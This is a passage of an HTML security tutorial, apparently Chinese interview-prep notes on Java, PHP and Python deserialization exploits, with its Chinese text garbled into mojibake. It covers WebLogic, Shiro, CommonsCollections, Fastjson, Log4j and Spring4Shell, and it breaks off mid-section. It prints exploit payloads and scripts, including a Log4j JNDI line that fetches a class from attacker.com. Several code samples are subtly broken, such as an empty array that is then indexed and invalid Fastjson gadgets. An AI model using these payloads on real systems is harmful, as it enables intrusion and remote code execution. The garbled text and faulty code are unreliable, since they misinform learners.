href="#WebLogic-ååºåˆ—åŒ–åŸç†" class="headerlink" title="WebLogic ååºåˆ—åŒ–åŸç†"></a>WebLogic ååºåˆ—åŒ–åŸç†</h3><ol><li><p><strong>XML ååºåˆ—åŒ–æ¼æ´</strong>ï¼š</p><ul><li>WebLogic çš„ XML ååºåˆ—åŒ–å­˜åœ¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„ XML æ•°æ®ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>touch /tmp/hacked<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>åå°æ–‡ä»¶ä¸Šä¼ æ¼æ´</strong>ï¼š</p><ul><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡åå°æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼ˆå¦‚ Webshellï¼‰ï¼Œä»è€Œè·å–æœåŠ¡å™¨æƒé™ã€‚</li></ul></li><li><p><strong>äºŒæ¬¡ URLDecode æƒé™ç»•è¿‡</strong>ï¼š</p><ul><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡äºŒæ¬¡ URL ç¼–ç ç»•è¿‡è¾“å…¥éªŒè¯ï¼Œè®¿é—®å—é™èµ„æºã€‚</li></ul></li></ol><h3 id="å†…å­˜é©¬ç›¸å…³åŸç†"><a href="#å†…å­˜é©¬ç›¸å…³åŸç†" class="headerlink" title="å†…å­˜é©¬ç›¸å…³åŸç†"></a>å†…å­˜é©¬ç›¸å…³åŸç†</h3><p>å†…å­˜é©¬æ˜¯ä¸€ç§é©»ç•™åœ¨å†…å­˜ä¸­çš„æ¶æ„ä»£ç ï¼Œé€šå¸¸é€šè¿‡ååºåˆ—åŒ–æ¼æ´æˆ–å…¶ä»–å†…å­˜æ“ä½œæ¼æ´æ³¨å…¥ã€‚å†…å­˜é©¬ä¸ä¼šå†™å…¥ç£ç›˜ï¼Œå› æ­¤éš¾ä»¥è¢«ä¼ ç»Ÿé˜²ç—…æ¯’è½¯ä»¶æ£€æµ‹åˆ°ã€‚</p><h4 id="ç¤ºä¾‹ä»£ç ï¼š-6"><a href="#ç¤ºä¾‹ä»£ç ï¼š-6" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java å†…å­˜é©¬ç¤ºä¾‹</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemoryHorse</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Runnable horse;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MemoryHorse</span><span class="params">(Runnable horse)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.horse = horse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span> (horse != <span class="literal">null</span>) &#123;</span><br><span class="line">            horse.run();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Shiro-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ—¶çš„-WAF-ç»•è¿‡"><a href="#Shiro-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ—¶çš„-WAF-ç»•è¿‡" class="headerlink" title="Shiro ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ—¶çš„ WAF ç»•è¿‡"></a>Shiro ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ—¶çš„ WAF ç»•è¿‡</h3><ol><li><p><strong>æ›´æ¢ HTTP å¤´</strong>ï¼š</p><ul><li>å¦‚æœ WAF æ‹¦æˆªäº†ç‰¹å®šçš„ HTTP å¤´ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨å…¶ä»–å¤´ä¼ é€’æ•°æ®ã€‚</li></ul></li><li><p><strong>å°† loader å†™å…¥ Cookie</strong>ï¼š</p><ul><li>å°† loader ä»£ç å†™å…¥ Cookieï¼Œé¿å… HTTP å¤´è¿‡é•¿çš„é—®é¢˜ã€‚</li></ul></li><li><p><strong>å°† shellcode å†™å…¥è¯·æ±‚ä½“</strong>ï¼š</p><ul><li>å°† shellcode æ”¾åœ¨è¯·æ±‚ä½“ä¸­ï¼Œé¿å… HTTP å¤´é•¿åº¦é™åˆ¶ã€‚</li></ul></li></ol><h4 id="ç¤ºä¾‹ä»£ç ï¼š-7"><a href="#ç¤ºä¾‹ä»£ç ï¼š-7" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† loader å†™å…¥ Cookie</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;loader&#x27;</span>: <span class="string">&#x27;Base64 encoded loader code&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† shellcode å†™å…¥è¯·æ±‚ä½“</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;shellcode&#x27;</span>: <span class="string">&#x27;Base64 encoded shellcode&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(<span class="string">&#x27;http://target.com/vulnerable&#x27;</span>, cookies=cookies, data=data)</span><br></pre></td></tr></table></figure><h3 id="ysoserial-åŸç†å’Œ-CommonCollections-åˆ©ç”¨é“¾"><a href="#ysoserial-åŸç†å’Œ-CommonCollections-åˆ©ç”¨é“¾" class="headerlink" title="ysoserial åŸç†å’Œ CommonCollections åˆ©ç”¨é“¾"></a>ysoserial åŸç†å’Œ CommonCollections åˆ©ç”¨é“¾</h3><ol><li><p><strong>ysoserial</strong>ï¼š</p><ul><li>ysoserial æ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆ Java ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾çš„å·¥å…·ã€‚</li><li>å®ƒåˆ©ç”¨äº† Java ç±»åº“ä¸­çš„ gadgets æ„é€ ååºåˆ—åŒ–é“¾ã€‚</li></ul></li><li><p><strong>CommonCollections åˆ©ç”¨é“¾</strong>ï¼š</p><ul><li><strong>CC1</strong>ï¼šåˆ©ç”¨ <code>InvokerTransformer</code> å’Œ <code>LazyMap</code> æ„é€ æ¶æ„é“¾ã€‚</li><li><strong>CC2</strong>ï¼šåˆ©ç”¨ <code>ConstructorConstructor</code> å’Œ <code>TransformingClassLoader</code> æ„é€ æ¶æ„é“¾ã€‚</li><li><strong>CC3</strong>ï¼šåˆ©ç”¨ <code>ChainedTransformer</code> å’Œ <code>LazyMap</code> æ„é€ æ¶æ„é“¾ã€‚</li></ul></li></ol><h4 id="ç¤ºä¾‹ä»£ç ï¼š-8"><a href="#ç¤ºä¾‹ä»£ç ï¼š-8" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨ ysoserial ç”Ÿæˆ payload</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;touch /tmp/hacked&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        transformers[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        transformers[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        transformers[<span class="number">2</span>] = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        transformers[<span class="number">3</span>] = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;command&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        outerMap.put(<span class="string">&quot;value&quot;</span>, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> TiedMapEntry.class.getDeclaredConstructor(Map.class, Object.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> constructor.newInstance(outerMap, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(entry);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Javaã€PHPã€Python-ååºåˆ—åŒ–çš„åŒºåˆ«å’Œç›¸åŒç‚¹"><a href="#Javaã€PHPã€Python-ååºåˆ—åŒ–çš„åŒºåˆ«å’Œç›¸åŒç‚¹" class="headerlink" title="Javaã€PHPã€Python ååºåˆ—åŒ–çš„åŒºåˆ«å’Œç›¸åŒç‚¹"></a>Javaã€PHPã€Python ååºåˆ—åŒ–çš„åŒºåˆ«å’Œç›¸åŒç‚¹</h3><h4 id="Java-ååºåˆ—åŒ–"><a href="#Java-ååºåˆ—åŒ–" class="headerlink" title="Java ååºåˆ—åŒ–"></a>Java ååºåˆ—åŒ–</h4><ul><li><strong>éœ€è¦åˆ©ç”¨é“¾</strong>ï¼šJava ååºåˆ—åŒ–é€šå¸¸éœ€è¦åˆ©ç”¨ååºåˆ—åŒ–é“¾æ¥è§¦å‘æ¼æ´ã€‚ååºåˆ—åŒ–é“¾æ˜¯æŒ‡é€šè¿‡ä¸€ç³»åˆ—çš„ç±»å’Œæ–¹æ³•è°ƒç”¨ï¼Œæœ€ç»ˆå®ç°æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaDeserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;malicious.ser&quot;</span>))) &#123;</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="PHP-ååºåˆ—åŒ–"><a href="#PHP-ååºåˆ—åŒ–" class="headerlink" title="PHP ååºåˆ—åŒ–"></a>PHP ååºåˆ—åŒ–</h4><ul><li><strong>éœ€è¦åˆ©ç”¨é“¾</strong>ï¼šPHP ååºåˆ—åŒ–åŒæ ·éœ€è¦åˆ©ç”¨ååºåˆ—åŒ–é“¾æ¥è§¦å‘æ¼æ´ã€‚é€šè¿‡ <code>__wakeup</code> æˆ– <code>__destruct</code> é­”æœ¯æ–¹æ³•æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaliciousClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialized</span> = <span class="string">&#x27;O:14:&quot;MaliciousClass&quot;:0:&#123;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized</span>);</span><br></pre></td></tr></table></figure></li></ul><h4 id="Python-ååºåˆ—åŒ–"><a href="#Python-ååºåˆ—åŒ–" class="headerlink" title="Python ååºåˆ—åŒ–"></a>Python ååºåˆ—åŒ–</h4><ul><li><strong>ä¸éœ€è¦åˆ©ç”¨é“¾</strong>ï¼šPython çš„ <code>pickle</code> æ¨¡å—æ”¯æŒ <code>__reduce__</code> æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥æ„é€ å‘½ä»¤æ‰§è¡Œã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MaliciousClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">malicious = MaliciousClass()</span><br><span class="line">serialized = pickle.dumps(malicious)</span><br><span class="line">pickle.loads(serialized)</span><br></pre></td></tr></table></figure></li></ul><h3 id="å®½å­—èŠ‚æ³¨å…¥åŸç†"><a href="#å®½å­—èŠ‚æ³¨å…¥åŸç†" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥åŸç†"></a>å®½å­—èŠ‚æ³¨å…¥åŸç†</h3><ul><li><strong>å®½å­—èŠ‚æ³¨å…¥</strong>ï¼šåˆ©ç”¨å¤šå­—èŠ‚å­—ç¬¦ç¼–ç ï¼ˆå¦‚GBKï¼‰ä¸­çš„ä¸€äº›ç‰¹æ€§ï¼Œé€šè¿‡æ³¨å…¥ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ <code>%bf%27</code>ï¼‰æ¥ç»•è¿‡è¾“å…¥éªŒè¯ã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1%bf%27&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Log4j-å¦‚ä½•ç»•è¿‡-trustcodebase"><a href="#Log4j-å¦‚ä½•ç»•è¿‡-trustcodebase" class="headerlink" title="Log4j å¦‚ä½•ç»•è¿‡ trustcodebase"></a>Log4j å¦‚ä½•ç»•è¿‡ trustcodebase</h3><ul><li><strong>Log4j ç»•è¿‡</strong>ï¼šé€šè¿‡æ„é€ ç‰¹æ®Šçš„ JNDI URI æ¥åŠ è½½æ¶æ„ç±»ï¼Œç»•è¿‡ <code>trustcodebase</code> çš„é™åˆ¶ã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jndiUri</span> <span class="operator">=</span> <span class="string">&quot;rmi://attacker.com/malicious&quot;</span>;</span><br><span class="line"><span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">logger.info(<span class="string">&quot;$&#123;jndi:&quot;</span> + jndiUri + <span class="string">&quot;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h3 id="Springboot-Shiro-ç¯å¢ƒå¦‚ä½•è¿›è¡Œæ¸—é€"><a href="#Springboot-Shiro-ç¯å¢ƒå¦‚ä½•è¿›è¡Œæ¸—é€" class="headerlink" title="Springboot+Shiro ç¯å¢ƒå¦‚ä½•è¿›è¡Œæ¸—é€"></a>Springboot+Shiro ç¯å¢ƒå¦‚ä½•è¿›è¡Œæ¸—é€</h3><ul><li><strong>æ¸—é€æ–¹æ³•</strong>ï¼šåˆ©ç”¨ Shiro çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®æ¥æ‰§è¡Œå‘½ä»¤ã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;your-key&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;malicious-data&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] encrypted = aes.encrypt(data.getBytes(), key.getBytes()).getBytes();</span><br><span class="line">        System.out.println(ByteSource.Util.bytesToHex(encrypted));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="å®æˆ˜ä¸­å¦‚ä½•åˆ¤æ–­-Fastjson-çš„ç‰ˆæœ¬"><a href="#å®æˆ˜ä¸­å¦‚ä½•åˆ¤æ–­-Fastjson-çš„ç‰ˆæœ¬" class="headerlink" title="å®æˆ˜ä¸­å¦‚ä½•åˆ¤æ–­ Fastjson çš„ç‰ˆæœ¬"></a>å®æˆ˜ä¸­å¦‚ä½•åˆ¤æ–­ Fastjson çš„ç‰ˆæœ¬</h3><ul><li><strong>åˆ¤æ–­ç‰ˆæœ¬</strong>ï¼šé€šè¿‡å‘é€ç‰¹å®šçš„è¯·æ±‚ï¼Œè§‚å¯Ÿè¿”å›çš„é”™è¯¯ä¿¡æ¯æˆ–å“åº”å†…å®¹æ¥åˆ¤æ–­ç‰ˆæœ¬ã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;java.lang.Runtime&quot;,&quot;exec&quot;:&quot;ls&quot;&#125;&#x27;</span> http://target.com/api</span><br></pre></td></tr></table></figure></li></ul><h3 id="Fastjson-æ–‡ä»¶è¯»å†™-gadget"><a href="#Fastjson-æ–‡ä»¶è¯»å†™-gadget" class="headerlink" title="Fastjson æ–‡ä»¶è¯»å†™ gadget"></a>Fastjson æ–‡ä»¶è¯»å†™ gadget</h3><ul><li><strong>æ–‡ä»¶è¯»å†™ gadget</strong>ï¼šåˆ©ç”¨ Fastjson çš„ååºåˆ—åŒ–æ¼æ´ï¼Œé€šè¿‡ç‰¹å®šçš„ gadget é“¾æ¥è¯»å†™æ–‡ä»¶ã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;exec\&quot;:\&quot;touch /tmp/test\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="å†…å­˜é©¬ç±»å‹ï¼Œå¦‚ä½•æ£€æµ‹"><a href="#å†…å­˜é©¬ç±»å‹ï¼Œå¦‚ä½•æ£€æµ‹" class="headerlink" title="å†…å­˜é©¬ç±»å‹ï¼Œå¦‚ä½•æ£€æµ‹"></a>å†…å­˜é©¬ç±»å‹ï¼Œå¦‚ä½•æ£€æµ‹</h3><ul><li><strong>å†…å­˜é©¬</strong>ï¼šé€šè¿‡åœ¨å†…å­˜ä¸­æ³¨å…¥æ¶æ„ä»£ç æ¥æŒä¹…åŒ–æ”»å‡»ã€‚</li><li><strong>æ£€æµ‹æ–¹æ³•</strong>ï¼šé€šè¿‡ç›‘æ§è¿›ç¨‹å†…å­˜ã€æ£€æŸ¥å¼‚å¸¸çš„å†…å­˜åˆ†é…å’Œä»£ç æ‰§è¡Œè¡Œä¸ºã€‚</li><li><strong>ç¤ºä¾‹</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨å·¥å…·å¦‚ Volatility æ£€æµ‹å†…å­˜é©¬</span></span><br><span class="line">volatility -f memory.dmp --profile=Win7SP1x64 malfind</span><br></pre></td></tr></table></figure><h3 id="Spring4Shell-åŸç†ã€æ£€æµ‹ä¸åˆ©ç”¨"><a href="#Spring4Shell-åŸç†ã€æ£€æµ‹ä¸åˆ©ç”¨" class="headerlink" title="Spring4Shell åŸç†ã€æ£€æµ‹ä¸åˆ©ç”¨"></a>Spring4Shell åŸç†ã€æ£€æµ‹ä¸åˆ©ç”¨</h3></li></ul><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>Spring4Shellï¼ˆCVE-2022-22965ï¼‰æ˜¯ä¸€ä¸ªå­˜åœ¨äº Spring æ¡†æ¶ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡ç‰¹åˆ¶çš„ HTTP 